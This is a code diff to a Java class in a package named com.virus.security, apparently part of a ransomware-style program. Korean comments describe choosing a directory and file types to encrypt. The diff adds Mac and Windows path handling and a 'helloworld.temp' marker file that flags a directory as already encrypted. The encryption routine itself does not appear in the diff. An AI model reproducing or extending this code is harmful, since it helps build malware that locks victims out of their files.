@@ -3,6 +3,7 @@ package com.virus.security;
 import org.apache.commons.io.FilenameUtils;
 
 import java.io.File;
+import java.io.FileOutputStream;
 import java.util.ArrayList;
 
 /**
@@ -12,7 +13,7 @@ public class SearchDirectory {
 
 
     private String defaultDirectory;
-
+    private boolean isWindow;
     private ArrayList<File> allFiles = new ArrayList<>();
     private ArrayList<File> encryptedFiles = new ArrayList<>();
 
@@ -29,13 +30,77 @@ public class SearchDirectory {
 
         //1. 암호화 할 경로 설정
 
-        setDefaultDirectory("C:/test");
+        setDefaultDirectory("/Users/codertimo/Desktop/test/");
+        this.isWindow = false;
+
         //setDefaultDirectory();
-
-
 
         //2. 암호화할 파일 타입을 설정
         initContainFilter();
+    }
+
+    public boolean isEncrypted()
+    {
+        File file = new File(defaultDirectory);
+            for (File f : file.listFiles())
+            {
+                if(f.getName().equals("helloworld.temp"))
+                {
+                    return true;
+                }
+            }
+       return false;
+    }
+
+    public void setEncrypted()
+    {
+        try {
+            if(defaultDirectory.endsWith("/") || defaultDirectory.endsWith("\\"))
+            {
+                FileOutputStream output = new FileOutputStream(defaultDirectory+"helloworld.temp");
+                output.close();
+            }
+            else
+            {
+                if(isWindow)
+                {
+                    FileOutputStream output = new FileOutputStream(defaultDirectory+"\\helloworld.temp");
+                    output.close();
+                }
+                else
+                {
+                    FileOutputStream output = new FileOutputStream(defaultDirectory + "/helloworld.temp");
+                    output.close();
+                }
+            }
+        }
+        catch (Exception e)
+        {
+            e.printStackTrace();
+        }
+
+    }
+
+    public void setDecrypted()
+    {
+        if(defaultDirectory.endsWith("/") || defaultDirectory.endsWith("\\"))
+        {
+            File file = new File(defaultDirectory+"helloworld.temp");
+            file.delete();
+        }
+        else
+        {
+            if(isWindow)
+            {
+               File file = new File(defaultDirectory+"\\helloworld.temp");
+               file.delete();
+            }
+            else
+            {
+                File file = new File(defaultDirectory + "/helloworld.temp");
+                file.delete();
+            }
+        }
     }
 
     public ArrayList<File> allFileSearch()
@@ -98,10 +163,12 @@ public class SearchDirectory {
         {
             case "Mac":
                 setMacDefaultDirectory();
+                this.isWindow = false;
                 break;
 
             case "Windows":
                 setWindowDefaultDirectory();
+                this.isWindow = true;
                 break;
         }
     }
